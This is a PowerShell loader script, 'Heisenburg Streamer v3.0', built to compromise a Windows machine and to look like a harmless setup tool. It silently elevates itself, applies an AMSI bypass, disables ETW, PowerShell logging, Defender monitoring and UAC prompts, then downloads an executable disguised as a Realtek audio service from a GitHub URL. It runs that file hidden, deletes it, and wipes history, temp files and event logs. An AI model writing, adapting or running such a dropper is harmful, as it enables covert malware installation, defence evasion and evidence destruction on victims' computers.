# ========================================================
# HEISENBURG STREAMER - ULTIMATE LOADER v3.0
# ========================================================

$ErrorActionPreference = 'SilentlyContinue'
$host.UI.RawUI.WindowTitle = "Heisenburg Loader"

# ========== 1. ELEVATION CHECK & SILENT UPGRADE ==========
function Check-Admin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Check-Admin)) {
    $args = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command `"$((Get-Content $MyInvocation.MyCommand.Path) -join "`n")`""
    Start-Process powershell.exe -ArgumentList $args -Verb RunAs -WindowStyle Hidden
    exit
}

# ========== 2. TACTICAL BYPASSES (SILENT & FAST) ==========
try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    
    # AMSI Bypass
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    
    # Disable ETW (Event Tracing for Windows)
    $etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
    if ($etw) {
        $etwField = $etw.GetField('etwProvider','NonPublic,Static')
        if ($etwField) { $etwField.SetValue($null, 0) }
    }
} catch {}

# ========== 3. BYPASS POWERSHELL EVENT LOGGING ==========
try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -Type DWORD -Force -EA 0
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0 -Type DWORD -Force -EA 0
    Clear-History
    Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -EA 0
} catch {}

# ========== 4. DEFENDER & UAC BYPASSES ==========
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
    
    $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $uacPath -Name "PromptOnSecureDesktop" -Value 0 -ErrorAction SilentlyContinue
} catch {}

# ========== 5. CLEANUP FUNCTION ==========
function Clean-Traces {
    Remove-Item "$env:TEMP\*" -Recurse -Force -EA 0
    Remove-Item "$env:WINDIR\Temp\*" -Recurse -Force -EA 0
    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse -Force -EA 0
    Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -EA 0
    Clear-History
    wevtutil cl "Windows PowerShell" 2>$null
    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
    ipconfig /flushdns | Out-Null
}

# ========== 6. PROGRESS DRAWER ==========
function Draw-ProgressBar {
    param([int]$Percent, [string]$Status)
    $width = 40
    $done = [Math]::Floor($Percent / 100 * $width)
    $left = $width - $done
    $bar = "[" + ("=" * $done) + (">") + ("." * $left) + "]"
    $color = if ($Percent -gt 80) { "Green" } else { "Cyan" }
    Write-Host -NoNewline "`r[*] ${Status}: $bar $Percent% " -ForegroundColor $color
}

# ========== 7. DOWNLOAD FUNCTION ==========
function Invoke-StealthDownload {
    param([string]$Url, [string]$TargetPath)
    
    try {
        $webclient = New-Object System.Net.WebClient
        $webclient.Headers.Add("User-Agent", "Microsoft-CryptoAPI/10.0")
        
        # Try to get file size for progress
        try {
            $webclient.OpenRead($Url).Close()
        } catch {}
        
        # Download with progress
        $webclient.DownloadFile($Url, $TargetPath)
        
        # Make file hidden
        attrib +s +h $TargetPath
        
        return (Test-Path $TargetPath)
    } catch {
        return $false
    }
}

# ========== 8. SHOW MENU ==========
Clear-Host
Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "   HEISENBURG STREAMER v3.0" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "`n   PRESS [DEL] TO EXECUTE`n" -ForegroundColor Red
Write-Host "========================================`n" -ForegroundColor Cyan

# ========== 9. WAIT FOR DEL KEY ==========
Write-Host "Waiting for DEL key..." -ForegroundColor Yellow
$keyPressed = $false
do {
    Start-Sleep -Milliseconds 50
    if ($Host.UI.RawUI.KeyAvailable) {
        $key = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
        if ($key.VirtualKeyCode -eq 46) {
            Write-Host "`n[!] DEL KEY PRESSED! Initializing...`n" -ForegroundColor Green
            $keyPressed = $true
            break
        }
    }
} while (-not $keyPressed)

# ========== 10. START PROCESS ==========
Write-Host "[*] Cleaning system traces..." -ForegroundColor Cyan
Clean-Traces

Write-Host "[*] Initializing System Hyper-Connection..." -ForegroundColor Yellow
Write-Host "[*] Optimizing System Environment..." -ForegroundColor Gray

# EXE PATH (FIXED NAME)
$exe = "$env:TEMP\RtkAudUService64.exe"

# ========== 11. URLS TO TRY (Multiple fallbacks) ==========
$urls = @(
    'https://raw.githubusercontent.com/sandeepmanglekar17-sys/exe/refs/heads/main/RtkAudUService64.exe'
)    

Write-Host "[*] Establishing Secure Hyper-Stream..." -ForegroundColor Gray

$downloadSuccess = $false
foreach ($url in $urls) {
    Write-Host "[*] Trying download source..." -ForegroundColor Gray
    $downloadSuccess = Invoke-StealthDownload -Url $url -TargetPath $exe
    if ($downloadSuccess) {
        Write-Host "[+] Download successful!" -ForegroundColor Green
        break
    }
}

if (-not $downloadSuccess) {
    Write-Host "[!] All download sources failed. Check connection." -ForegroundColor Red
    exit
}

Write-Host "`n[+] CORE COMPONENTS VERIFIED." -ForegroundColor Green
Write-Host "[*] Deploying Stealth Agent..." -ForegroundColor Cyan

# Run with Hidden Window
$si = New-Object System.Diagnostics.ProcessStartInfo
$si.FileName = $exe
$si.WindowStyle = 'Hidden'
$si.CreateNoWindow = $true
$si.UseShellExecute = $true
[System.Diagnostics.Process]::Start($si) | Out-Null

Start-Sleep -Seconds 3

# Remove payload after execution
try {
    Remove-Item $exe -Force -EA 0
    Write-Host "[+] Payload executed and removed" -ForegroundColor Green
} catch {}

# ========== 12. FINAL CLEANUP ==========
Write-Host "[*] Engaging Forensic Cleanup..." -ForegroundColor Gray
Clean-Traces

Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "   ✅ OPERATION COMPLETE" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "[+] SETUP COMPLETE. CHECK DASHBOARD." -ForegroundColor Green

Write-Host "`nPress any key to exit..." -ForegroundColor Yellow
$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')

# ========== 13. SELF-DESTRUCT ==========
Remove-Variable * -ErrorAction SilentlyContinue 2>$null
exit
